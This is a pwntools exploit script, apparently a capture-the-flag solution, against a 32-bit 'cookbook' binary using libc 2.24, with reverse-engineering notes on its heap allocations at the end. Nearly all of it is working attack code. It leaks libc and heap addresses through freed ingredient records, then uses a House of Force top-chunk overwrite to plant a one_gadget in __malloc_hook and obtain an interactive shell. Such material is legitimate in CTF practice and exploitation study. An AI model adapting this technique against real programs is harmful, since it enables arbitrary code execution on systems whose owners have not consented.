#!/usr/bin/env python3

from pwn import *

exe = ELF("./cookbook")
libc = ELF("./libc-2.24.so")
ld = ELF("./ld-2.24.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def add_ingredient(name = "", export = 0):
    	r.sendline("a")

    	r.sendline("n") # new

    	if name != "":
    		r.sendline("g") # give name
    		r.sendline(name)

    	if export != 0:
    		r.sendline("e") # export

    def delete_ingredient(name):
    	r.sendline("e")
    	r.sendline(name)

    def list_ingredient():
    	r.sendline("l")

    def cookbook_name(size, data):
    	r.sendline("g")
    	r.sendline(size)
    	r.sendline(data)

    def add_recipe(name):
    	r.sendline("c")

    	r.sendline("n") # new
    	r.sendline("g") # give name
    	r.sendline(name)

    r.sendline("name")

    # libc leak
    add_ingredient("banana1", 1)
    add_ingredient("banana2")
    r.sendline("q") # quit add_ingredient menu

    delete_ingredient("banana1")
    add_ingredient("", 1)
    r.sendline("q")

    list_ingredient()
    r.recvuntil("calories: -")
    leak = int("-" + r.recvline()) & 0xFFFFFFFF
    libc.address = leak - 0x1b6850
    log.info("libc base address: {}".format(hex(libc.address)))
    log.info("__malloc_hook: {}".format(hex(libc.symbols['__malloc_hook'])))

    one_gadget = libc.address + 0x3af1c # 0x3af1e ; 0x3af22 ; 0x3af29 ; 0x602f5 ; 0x602f6
    # heap leak

    add_ingredient("")
    r.sendline("d") #discard current ingredient
    r.sendline("q") # quit add_ingredient menu
    cookbook_name("0x80", "l33t ch3f")
    
    add_ingredient("banana3", 1)
    r.sendline("q")
    
    list_ingredient()
    r.recvuntil("name: banana3")
    r.recvuntil("price: ")
    leak = int(r.recvline())
    heap = leak - 0x13f0
    log.info("heap base address: {}".format(hex(heap)))

    # House of Force

    add_recipe("A"*0x380 + p32(0xFFFFFFF1))
    r.sendline("q") # quit add_recipe menu

    cookbook_name(hex(libc.symbols['__malloc_hook'] - 0x10 - (heap+0x1928)), "l33t ch3f")
    cookbook_name("0x10", p32(one_gadget))
    
    cookbook_name("0xdeadbeef", "l33t")
    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

set_name
	- allocates chunk (calloc(0x40,1)), saves username and saves ptr at PTRNAME_0804d0ac
	- replaces any newline with null if necessary

alloc_ingrd
	- calloc(1, 0x90)
	- [0], [1] saves 2 nrs
	- [2] saves string ingredient
	- +0x8c saves its own pointer - heap leak?

listing_ingrd
	- saves at 0x0804d094 a ptr to a single linked list (calloc(1, 8)) - [0] ingredient, [1] ptr to next
	- heap leak?

setup_igrd - calls alloc_ingrd and listing_ingrd a bunch of times

'''